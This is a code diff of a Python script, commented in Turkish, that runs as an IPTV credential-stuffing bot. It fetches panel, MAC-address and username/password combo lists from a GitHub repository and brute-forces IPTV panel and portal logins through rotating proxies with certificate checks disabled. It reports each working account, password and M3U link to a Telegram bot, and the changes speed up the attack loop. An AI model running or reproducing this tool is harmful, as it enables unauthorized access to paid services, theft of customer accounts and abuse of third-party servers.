@@ -6,7 +6,7 @@ import requests
 from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-# SSL ve Cipher yapılandırması (Güçlendirilmiş bağlantı)
+# SSL ve Cipher yapılandırması
 requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -14,7 +14,7 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "Otonom IPTV Tarayıcı (Proxy Destekli) Aktif!"
+    return "IPTV Tarayıcı Aktif!"
 
 def run_web():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
@@ -27,7 +27,7 @@ def telegrama_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
-        requests.post(url, data=data, timeout=10)
+        requests.post(url, data=data, timeout=5)
     except Exception as e:
         print(f"[!] Telegram mesajı gönderilemedi: {e}")
 
@@ -46,7 +46,6 @@ def proxy_sec(proxy_listesi):
     p = random.choice(proxy_listesi).strip()
     if not p:
         return None
-    # http / https proxy formatı
     if not p.startswith("http"):
         p = f"http://{p}"
     return {"http": p, "https": p}
@@ -56,15 +55,15 @@ def m3u_tara(panel, user, pas, proxy_listesi):
     proxies = proxy_sec(proxy_listesi)
     try:
         if proxies:
-            res = requests.get(api_url, headers=HEADERd, timeout=6, verify=False, proxies=proxies)
+            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False, proxies=proxies)
         else:
-            res = requests.get(api_url, headers=HEADERd, timeout=6, verify=False)
+            res = requests.get(api_url, headers=HEADERd, timeout=3.5, verify=False)
             
         if res.status_code == 200 and 'user_info' in res.text:
             if '"auth":1' in res.text or '"status":"Active"' in res.text:
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 mesaj = (
-                    f"🔥 <b>M3U HİT BULUNDU! (Proxy ile)</b>\n"
+                    f"🔥 <b>M3U HİT BULUNDU!</b>\n"
                     f"🌐 <b>Panel:</b> http://{panel}\n"
                     f"👤 <b>User:</b> <code>{user}</code>\n"
                     f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
@@ -82,13 +81,13 @@ def mac_tara(panel, mac, proxy_listesi):
     proxies = proxy_sec(proxy_listesi)
     try:
         if proxies:
-            res = requests.get(mac_url, headers=headers, timeout=6, verify=False, proxies=proxies)
+            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False, proxies=proxies)
         else:
-            res = requests.get(mac_url, headers=headers, timeout=6, verify=False)
+            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False)
             
         if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
             mesaj = (
-                f"🔥 <b>MAC HİT BULUNDU! (Proxy ile)</b>\n"
+                f"🔥 <b>MAC HİT BULUNDU!</b>\n"
                 f"🌐 <b>Panel:</b> http://{panel}\n"
                 f"🎯 <b>MAC:</b> <code>{mac}</code>"
             )
@@ -99,9 +98,6 @@ def mac_tara(panel, mac, proxy_listesi):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Proxy Destekli Bulut Otonom Tarayıcı Başlatıldı...")
-    telegrama_gonder("🚀 <b>Proxy Destekli IPTV Botu Başlatıldı!</b>")
-    
     MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/mac_list/MAC.txt"
     PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
     COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
@@ -109,21 +105,17 @@ def arka_plan_tarayici():
     
     while True:
         try:
-            print("[i] GitHub'dan güncel veriler ve proxy'ler çekiliyor...")
-            
-            # Proxy listesini çek
             proksiler = []
             try:
-                r_proxy = requests.get(PROXY_RAW_URL, timeout=10)
+                r_proxy = requests.get(PROXY_RAW_URL, timeout=5)
                 if r_proxy.status_code == 200:
                     proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
-                    print(f"[+] GitHub'dan {len(proksiler)} adet proxy yüklendi.")
-            except Exception as e:
-                print(f"[!] Proxy'ler çekilemedi (Direkt IP ile devam edilecek): {e}")
+            except:
+                pass
 
             maclar = []
             try:
-                r_mac = requests.get(MAC_RAW_URL, timeout=10)
+                r_mac = requests.get(MAC_RAW_URL, timeout=5)
                 if r_mac.status_code == 200:
                     maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
             except:
@@ -131,7 +123,7 @@ def arka_plan_tarayici():
 
             paneller = []
             try:
-                r_panel = requests.get(PANEL_RAW_URL, timeout=10)
+                r_panel = requests.get(PANEL_RAW_URL, timeout=5)
                 if r_panel.status_code == 200:
                     paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
             except:
@@ -139,7 +131,7 @@ def arka_plan_tarayici():
 
             combolar = []
             try:
-                r_combo = requests.get(COMBO_RAW_URL, timeout=10)
+                r_combo = requests.get(COMBO_RAW_URL, timeout=5)
                 if r_combo.status_code == 200:
                     for satir in r_combo.text.splitlines():
                         satir = satir.strip()
@@ -150,30 +142,30 @@ def arka_plan_tarayici():
                 pass
 
             if not paneller and not maclar and not combolar:
-                print("[!] Uyarı: GitHub'dan veri alınamadı, 5 dakika sonra tekrar denenecek...")
-                time.sleep(300)
+                time.sleep(120)
                 continue
 
             if maclar and paneller:
-                print("[i] Proxy destekli MAC taraması başlatılıyor...")
+                telegrama_gonder("⏳ <b>MAC tarama başlatıldı</b>")
                 for panel in paneller:
                     for mac in maclar:
                         mac_tara(panel, mac, proksiler)
-                        time.sleep(0.3)
+                        time.sleep(0.05)
+                telegrama_gonder("✅ <b>MAC tarama bitti</b>")
 
             if combolar and paneller:
-                print("[i] Proxy destekli M3U taraması başlatılıyor...")
+                telegrama_gonder("⏳ <b>M3U tarama başlatıldı</b>")
                 for panel in paneller:
                     for user, pas in combolar:
                         m3u_tara(panel, user, pas, proksiler)
-                        time.sleep(0.3)
+                        time.sleep(0.05)
+                telegrama_gonder("✅ <b>M3U tarama bitti</b>")
 
-            print("[i] Tüm turlar tamamlandı, 15 dakika sonra tekrar taranacak...")
-            time.sleep(900)
+            time.sleep(300)
 
         except Exception as e:
-            print(f"[!] Döngü Hatası: {e}")
-            time.sleep(60)
+            print(f"[!] Hata: {e}")
+            time.sleep(30)
 
 if __name__ == '__main__':
     t = threading.Thread(target=run_web)
